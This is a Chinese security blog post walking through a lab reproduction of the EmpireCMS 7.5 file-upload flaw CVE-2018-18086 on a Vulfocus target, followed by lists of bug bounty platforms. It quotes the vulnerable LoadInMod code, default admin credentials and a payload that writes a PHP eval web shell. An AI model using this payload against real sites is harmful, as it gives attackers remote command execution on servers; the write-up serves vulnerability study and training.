# 原创
：  【漏洞复现-EmpireCms-文件上传】vulfocus/empirecms-cve_2018_18086

# 【漏洞复现-EmpireCms-文件上传】vulfocus/empirecms-cve_2018_18086

 <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）新建上传、特定后缀文件（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|文件上传漏洞复现|目标|状态
|[【漏洞复现-dedecms-文件上传】vulfocus/dedecms-cve_2019_8933](https://blog.csdn.net/qq_53079406/article/details/127348900)|后台的新建、上传文件功能、修改后缀功能|已发布
|[【漏洞复现-tomcat-弱口令+文件上传】vulfocus/tomcat-pass-getshell](https://blog.csdn.net/qq_53079406/article/details/127272129)|后台部署WAR报getshell|已发布
|[【漏洞复现-weblogic-文件上传】vulfocus/weblogic-cve_2018_2894](https://blog.csdn.net/qq_53079406/article/details/127257176)|后台新建、上传文件的功能点|已发布
|[【漏洞复现-showdoc-文件上传】​vulfocus/showdoc-cnvd_2020_26585](https://blog.csdn.net/qq_53079406/article/details/127251592)|构造上传文件的数据包|已发布
|[【漏洞复现-monstra-文件上传】vulfocus/monstra_cve_2020_13384](https://blog.csdn.net/qq_53079406/article/details/127241657)|PHP的特殊后缀绕过|已发布
|[【漏洞复现-oklite-文件上传】vulfocus/oklite-cve_2019_16131](https://blog.csdn.net/qq_53079406/article/details/127240000)|后台上传zip数据包，服务器自动解析|已发布
|[【漏洞复现-dcrCms-文件上传】vulfocus/dcrcms-cnvd_2020_27175](https://blog.csdn.net/qq_53079406/article/details/127238674)|后台上传点，修改上传文件的类型|已发布
|[【漏洞复现-TypesetterCms-文件上传ZIP】vulfocus/typesetter-cve_2020_25790](https://blog.csdn.net/qq_53079406/article/details/127235610)|后台自带解析功能|已发布
|[【漏洞复现-phpok-文件上传】vulfocus/phpok-cve_2018_12491](https://blog.csdn.net/qq_53079406/article/details/127229175)|后台新建、上传|已发布
|[【漏洞复现-EmpireCms-文件上传】vulfocus/empirecms-cve_2018_18086](https://blog.csdn.net/qq_53079406/article/details/127227989)|新建上传、特定后缀文件|已发布
|[【漏洞复现-Apache-文件上传】vulfocus/apache-cve_2017_15715](https://blog.csdn.net/qq_53079406/article/details/127196849)|后缀检测截断|已发布
|[【漏洞复现-jquery-文件上传】vulfocus/jquery-cve_2018_9207](https://blog.csdn.net/qq_53079406/article/details/127195214)|curl命令上传工具|已发布
|[【漏洞复现-Tomacat-文件上传】vulfocus/tomcat-cve_2017_12615](https://blog.csdn.net/qq_53079406/article/details/127197695)|JSP后门文件|已发布
|2023将更新更多，敬请期待|——|——
</tbody></table>


---


**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[1.4、漏洞分析：](#1.4%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.4、解题：](#2.4%E3%80%81%E8%A7%A3%E9%A2%98%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)
123.58.224.8:48549
123.58.224.8:47450


 123.58.224.8:47450






> 
<h3>1.2、知识:</h3>
1、file_put_contents函数
file_put_contents() 函数把一个字符串写入文件中
<hr/>
语法：
int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )
<table><tbody>|参数|描述
|file|必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。
|data|必需。规定要写入文件的数据。可以是字符串、数组或数据流。
<tr>|mode<td>可选。规定如何打开/写入文件。可能的值： 
     </td></tr>|context|可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。
</tbody></table>
<hr/>
示例：
&lt;?php file_put_contents("shell1.php","&lt;?php phpinfo()?&gt;");?&gt;
将&lt;?php phpinfo()?&gt;重新创建并写入到shell1.php新文件中（如果不存在这个文件）
<hr/>

该函数访问文件时，遵循以下规则：
- 如果设置了 FILE_USE_INCLUDE_PATH，那么将检查 *filename* 副本的内置路径- 如果文件不存在，将创建一个文件- 打开文件- 如果设置了 LOCK_EX，那么将锁定文件- 如果设置了 FILE_APPEND，那么将移至文件末尾。否则，将会清除文件的内容- 向文件中写入数据- 关闭文件并对所有文件解锁



---


> 
<h3>1.3、描述：</h3>
EmpireCMS 7.5版本中的e/class/moddofun.php文件的‘LoadInMod’函数存在安全漏洞。攻击者可利用该漏洞上传任意文件


> 
<h3>1.4、漏洞分析：</h3>
漏洞代码位置：/e/class/moddofun.php
<pre><code>//导入模型
elseif($enews=="LoadInMod")
{
	$file=$_FILES['file']['tmp_name'];
    $file_name=$_FILES['file']['name'];
    $file_type=$_FILES['file']['type'];
    $file_size=$_FILES['file']['size'];
	LoadInMod($_POST,$file,$file_name,$file_type,$file_size,$logininid,$loginin);
}</code></pre>
转到LoadInMod定义，make_password(10)对文件名进行加密重命名
但是include()直接包含上传的文件，这样就可以绕过重命名的文件
@include($path); 直接包含文件
<pre><code>//上传文件
	$path=ECMS_PATH."e/data/tmp/mod/uploadm".time().make_password(10).".php";
	$cp=@move_uploaded_file($file,$path);
	if(!$cp)
	{
		printerror("EmptyLoadInMod","");
	}
	DoChmodFile($path);
	@include($path);
	UpdateTbDefMod($tid,$tbname,$mid);</code></pre>



---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
123.58.224.8:47450/empirecms/e/admin/


账号/密码:
admin/123456




 （发现需要mod后缀文件）

使用file_put_contents函数，写入文件shell1.php
&lt;?php file_put_contents("shell1.php","&lt;?php phpinfo()?&gt;");?&gt;



 <img alt="" height="229" src="https://img-blog.csdnimg.cn/5f1c96262eb944269a7b3daa90388c61.png" width="541"/>
 解析成功


<hr/>

这次使用函数，写入后门代码
（$需要进行转义处理）
&lt;?php file_put_contents("webshell.php","&lt;?php @eval(\$_POST[cmd]); ?&gt;");?&gt;


 <img alt="" height="485" src="https://img-blog.csdnimg.cn/2142ebb2ceb749c39ba53c89b0785b3b.png" width="1200"/>
 访问http://123.58.224.8:26156/empirecms/e/admin/webshell.php
(没有提示访问文件不存在，就说明上传成功了)

使用工具进行连接
（文件路径从已知的路径信息中，一点一点推）

<img alt="" height="866" src="https://img-blog.csdnimg.cn/573b9ac2f01848f8bb41d3604c7b301d.png" width="1200"/> 可以找到写入的一些文件<img alt="" height="866" src="https://img-blog.csdnimg.cn/36015a1519b64df682c0255045a19064.png" width="1200"/>



> 
<h3>2.4、解题：</h3>





---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

